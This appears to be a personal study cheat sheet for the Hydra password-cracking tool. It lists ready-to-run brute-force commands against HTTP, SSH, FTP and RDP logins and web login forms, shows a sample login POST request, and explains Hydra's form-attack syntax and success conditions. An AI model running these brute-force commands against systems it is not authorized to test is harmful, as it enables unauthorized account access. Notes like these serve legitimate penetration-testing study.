# Hydra
- Can brute force FTP, SSH, HTTP, SMTP, POP3, IMAP, MYSQL, MSSQL, VNC, RDP:
- HTTP: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
- Multiple SSH servers: `hydra -l root -p toor -M targets.txt ssh`
- FTP on non-standard port: `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
- Web Login Form: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
- RDP Brute-forcing: `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

- Look at the HTML of the login form for details


- The `POST` method indicates that data is being sent to the server to create or update a resource.
- `/login` is the URL endpoint handling the login request.
- The `Content-Type` header specifies how the data is encoded in the request body.
- The `Content-Length` header indicates the size of the data being sent.
- The request body contains the username and password, encoded as key-value pairs.
- Hydra's `http-post-form` service is specifically designed to target login forms: `hydra [options] target http-post-form "path:params:condition_string"`
- You can specify what success or failure is:
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"`
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"`

- Form Parameters: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (^USER^ and ^PASS^) within these parameters with values from your wordlists.
- Additional Fields: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the params string. These can have static values or dynamic placeholders if their values change with each request.
- Success Condition: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).

- The form submits data to the root path (/).
  - The username field is named username.
  - The password field is named password.
